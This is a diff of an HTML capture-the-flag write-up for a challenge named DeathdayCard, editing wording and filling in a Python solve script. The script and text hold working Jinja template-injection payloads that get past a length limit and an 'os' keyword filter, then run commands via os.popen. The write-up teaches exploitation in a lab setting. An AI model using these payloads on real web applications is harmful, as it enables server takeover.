@@ -1300,7 +1300,7 @@
   class="readtime"
   data-bs-toggle="tooltip"
   data-bs-placement="bottom"
-  title="1465 words"
+  title="1457 words"
 >
   <em>8 min</em> read</span>
 
@@ -1351,8 +1351,11 @@
     <ul>
       <li><a href="#verifying-ssti">Verifying SSTI</a></li>
       <li><a href="#bypassing-restriction">Bypassing restriction</a>
-      - <a href="#theory">Theory</a>
-      - <a href="#practice">Practive</a></li>
+        <ul>
+          <li><a href="#theory">Theory</a></li>
+          <li><a href="#practice">Practive</a></li>
+        </ul>
+      </li>
       <li><a href="#scripting">Scripting</a></li>
       <li><a href="#getting-the-flag">Getting the Flag</a></li>
     </ul>
@@ -1746,7 +1749,7 @@
        <span class="k">return</span> <span class="bp">False</span>
 </pre></td></tr></tbody></table></code></div></div>
 
-<p>Ok so we clearely have an SSTI, but with <strong>max 50 chars by input</strong> and we <strong>can’t type “os”</strong> in our payload. Or can we ?</p>
+<p>Ok so we clearly have an SSTI, but with <strong>maximum 50 chars by input</strong> and we <strong>can’t type “os”</strong> in our payload. Or can we ?</p>
 
 <h1 id="exploitation">Exploitation</h1>
 
@@ -1757,23 +1760,23 @@
 
 <p>Let’s try a payload that passes the security checks:
 <a href="/assets/img/writeups/DeathdayCard/index.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/DeathdayCard/index.png" alt="index"  loading="lazy"></a>
-<a href="/assets/img/writeups/DeathdayCard/initial_ssti.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/DeathdayCard/initial_ssti.png" alt="index"  loading="lazy"></a></p>
-
-<p>We confirm that all inputs are vulnerable to SSTI.</p>
+<a href="/assets/img/writeups/DeathdayCard/initial_ssti.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/DeathdayCard/initial_ssti.png" alt="index"  loading="lazy"></a>
+<em>All inputs are vulnerable to SSTI.</em></p>
 
 <h3 id="bypassing-restriction"><span class="me-2">Bypassing restriction</span><a href="#bypassing-restriction" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
 
-<p>The first validation is quite annoying, but can easely be bypassed since we have 4 inputs. Problem is: <code class="language-plaintext highlighter-rouge">{{ x }}</code> will basically be replaced by <code class="language-plaintext highlighter-rouge">print(x)</code>, and in python you can’t assign variable in a print cause if you do:</p>
+<p>The first validation is quite annoying, but can easily be bypassed since we have 4 inputs. Problem is: <code class="language-plaintext highlighter-rouge">{{ x }}</code> will basically be replaced by <code class="language-plaintext highlighter-rouge">print(x)</code>, and in python you can’t <strong>assign variables</strong> in a print statement:</p>
+
 <div class="language-py highlighter-rouge"><div class="code-header">
         <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 </pre></td><td class="rouge-code"><pre><span class="nf">print</span><span class="p">(</span><span class="n">a</span><span class="o">=</span><span class="sh">"</span><span class="s">b</span><span class="sh">"</span><span class="p">)</span>
 </pre></td></tr></tbody></table></code></div></div>
-<p>You’re trying to call <code class="language-plaintext highlighter-rouge">print</code> with argument <code class="language-plaintext highlighter-rouge">a</code> set to <code class="language-plaintext highlighter-rouge">"b"</code>, therefore not assigning a variable. So is it impossible ?</p>
+<p>You’re trying to call <code class="language-plaintext highlighter-rouge">print</code> with the argument <code class="language-plaintext highlighter-rouge">a</code> set to <code class="language-plaintext highlighter-rouge">"b"</code>, so you’re not assigning a variable. Is it impossible then ?</p>
 
 <h4 id="theory"><span class="me-2">Theory</span><a href="#theory" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
 
-<p>Reading this excellent <a href="https://niebardzo.github.io/2020-11-23-exploiting-jinja-ssti/">article</a> I found a way. We can use the config object to temporarly store some data. So for example we can do:</p>
+<p>Reading this <a href="https://niebardzo.github.io/2020-11-23-exploiting-jinja-ssti/">excellent article</a> I found a way. We can use the config object to temporarily store some data. So for example:</p>
 
 <div class="language-py highlighter-rouge"><div class="code-header">
         <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
@@ -1789,10 +1792,10 @@
 </pre></td></tr></tbody></table></code></div></div>
 
 <blockquote>
-  <p>Wait that is just a clear loss of characters !</p>
+  <p>Wait, that’s just a clear loss of characters!</p>
 </blockquote>
 
-<p>Yes but actually no. This trick can be combined with another one: taking variable from <strong>GET</strong> parameters <em>(aka from the URL)</em> using this payload:</p>
+<p>Yes, but actually, no. This trick can be combined with another one: <strong>storing a variable from a GET parameter</strong> <em>(aka from the URL)</em> using:</p>
 
 <div class="language-py highlighter-rouge"><div class="code-header">
         <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
@@ -1800,16 +1803,16 @@
 </pre></td><td class="rouge-code"><pre><span class="p">{{</span> <span class="n">config</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">a</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="p">))</span> <span class="p">}}</span>
 </pre></td></tr></tbody></table></code></div></div>
 
-<p>This will put the value provided via the url <code class="language-plaintext highlighter-rouge">a</code> parameter <em>(e.g: <code class="language-plaintext highlighter-rouge">?a=VALUE</code>)</em> and store it in <code class="language-plaintext highlighter-rouge">config.a</code>.</p>
+<p>This code will basically store the value provided via the <code class="language-plaintext highlighter-rouge">a</code> GET parameter <em>(e.g., <code class="language-plaintext highlighter-rouge">?a=VALUE</code>)</em> and store it in <code class="language-plaintext highlighter-rouge">config.a</code>.</p>
 
 <h4 id="practice"><span class="me-2">Practice</span><a href="#practice" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
 
-<p>That will be useful to bypass the <code class="language-plaintext highlighter-rouge">if os in a,b,c,d</code> check. For example we can post the form on this url:</p>
+<p>We can bypass the <code class="language-plaintext highlighter-rouge">if "os" in a or "os" in b...</code> check <em>(first validation)</em>, simply by posting the form on this url:</p>
 <ul>
   <li><a href="https://deathday.ctf.prgy.in?a=os">https://deathday.ctf.prgy.in?a=os</a></li>
 </ul>
 
-<p>and store the <code class="language-plaintext highlighter-rouge">"os"</code> string in <code class="language-plaintext highlighter-rouge">config.a</code> like this, effectively <strong>bypassing the first validation</strong>:</p>
+<p>and storing the <code class="language-plaintext highlighter-rouge">"os"</code> string in <code class="language-plaintext highlighter-rouge">config.a</code> like this:</p>
 
 <div class="language-py highlighter-rouge"><div class="code-header">
         <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
@@ -1817,9 +1820,9 @@
 </pre></td><td class="rouge-code"><pre><span class="p">{{</span> <span class="n">config</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">a</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="p">))</span> <span class="p">}}</span>
 </pre></td></tr></tbody></table></code></div></div>
 
-<p>Essentially, we sacrified <strong>50 characters on 200</strong> (the first input, “Sender’s Name”) to bypass the first check. <strong>Now <code class="language-plaintext highlighter-rouge">config.a = "os"</code></strong>. 
+<p>Essentially, we sacrificed <strong>50 characters on 200</strong> <em>(the first input, “Sender’s Name”)</em> to bypass the first check. <strong>Now <code class="language-plaintext highlighter-rouge">config.a = "os"</code></strong>. 
 <br /><br />
-Next using the “Recipient’s Name” input, we can claim up to the <code class="language-plaintext highlighter-rouge">os</code> module using the <code class="language-plaintext highlighter-rouge">config.a</code> variable with this payload:</p>
+Next using the “Recipient’s Name” input, we can claim up to the <code class="language-plaintext highlighter-rouge">os</code> module using the <code class="language-plaintext highlighter-rouge">config.a</code> variable, and store it in <code class="language-plaintext highlighter-rouge">config.b</code>, with this payload:</p>
 
 <div class="language-py highlighter-rouge"><div class="code-header">
         <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
@@ -1827,11 +1830,9 @@ Next using the “Recipient’s Name” input, we can claim up to the <code clas
 </pre></td><td class="rouge-code"><pre><span class="p">{{</span> <span class="n">config</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">b</span><span class="o">=</span><span class="n">lipsum</span><span class="p">.</span><span class="n">__globals__</span><span class="p">[</span><span class="n">config</span><span class="p">.</span><span class="n">a</span><span class="p">])</span> <span class="p">}}</span>
 </pre></td></tr></tbody></table></code></div></div>
 
-<p>We essentially have <code class="language-plaintext highlighter-rouge">config.b = OS_MODULE</code>. Since we have two inputs left, we can proceed as follows:</p>
+<p>We essentially have <code class="language-plaintext highlighter-rouge">config.b = OS_MODULE</code>. Since we have two inputs left, we can proceed as follows.</p>
 
-<ul>
-  <li>Third input <em>(message)</em> will be used to store the command that we wan’t to execute, command that we will pass through the URL parameter <code class="language-plaintext highlighter-rouge">cmd</code>.</li>
-</ul>
+<p>Third input <em>(message)</em> will be used to store the command that we want to execute, command that we will pass through the URL parameter <code class="language-plaintext highlighter-rouge">cmd</code>.</p>
 
 <div class="language-py highlighter-rouge"><div class="code-header">
         <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
@@ -1839,9 +1840,7 @@ Next using the “Recipient’s Name” input, we can claim up to the <code clas
 </pre></td><td class="rouge-code"><pre><span class="p">{{</span> <span class="n">config</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">cmd</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">cmd</span><span class="sh">'</span><span class="p">))</span> <span class="p">}}</span>
 </pre></td></tr></tbody></table></code></div></div>
 
-<ul>
-  <li>Fourth input <em>(Final message)</em> will execute the command using the <code class="language-plaintext highlighter-rouge">os.popen(cmd).read()</code> syntax</li>
-</ul>
+<p>Fourth input <em>(Final message)</em> will execute the command using the <code class="language-plaintext highlighter-rouge">os.popen(cmd).read()</code> syntax</p>
 
 <div class="language-py highlighter-rouge"><div class="code-header">
         <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
@@ -1856,7 +1855,7 @@ Next using the “Recipient’s Name” input, we can claim up to the <code clas
     <tr>
       <th style="text-align: left">Input name</th>
       <th style="text-align: left">SSTI Payload</th>
-      <th style="text-align: left">Pseudo-Code</th>
+      <th style="text-align: left">Pseudocode</th>
     </tr>
   </thead>
   <tbody>
@@ -1961,13 +1960,13 @@ Next using the “Recipient’s Name” input, we can claim up to the <code clas
 
     <span class="k">return</span> <span class="nf">post</span><span class="p">(</span><span class="n">URL</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
         <span class="c1"># Store "os" (str) in config.a
-</span>        <span class="sh">"</span><span class="s">sender</span><span class="sh">"</span><span class="p">:</span> <span class="sh">""""""</span><span class="p">,</span>
+</span>        <span class="sh">"</span><span class="s">sender</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"""</span><span class="s">{{config.update(a=request.args.get(</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="s">))}}</span><span class="sh">"""</span><span class="p">,</span>
         <span class="c1"># Store os (module) in config.b
-</span>        <span class="sh">"</span><span class="s">recipient</span><span class="sh">"</span><span class="p">:</span> <span class="sh">""""""</span><span class="p">,</span>
+</span>        <span class="sh">"</span><span class="s">recipient</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"""</span><span class="s">{{config.update(b=lipsum.__globals__[config.a])}}</span><span class="sh">"""</span><span class="p">,</span>
         <span class="c1"># Store the command that we want to execute in config.c
-</span>        <span class="sh">"</span><span class="s">message</span><span class="sh">"</span><span class="p">:</span> <span class="sh">""""""</span><span class="p">,</span>
+</span>        <span class="sh">"</span><span class="s">message</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"""</span><span class="s">{{config.update(cmd=request.args.get(</span><span class="sh">'</span><span class="s">cmd</span><span class="sh">'</span><span class="s">))}}</span><span class="sh">"""</span><span class="p">,</span>
         <span class="c1"># display os.popen(command).read()
-</span>        <span class="sh">"</span><span class="s">message_final</span><span class="sh">"</span><span class="p">:</span> <span class="sh">""""""</span>
+</span>        <span class="sh">"</span><span class="s">message_final</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"""</span><span class="s">{{config.b.popen(config.cmd).read()}}</span><span class="sh">"""</span>
     <span class="p">})</span>
 
 <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
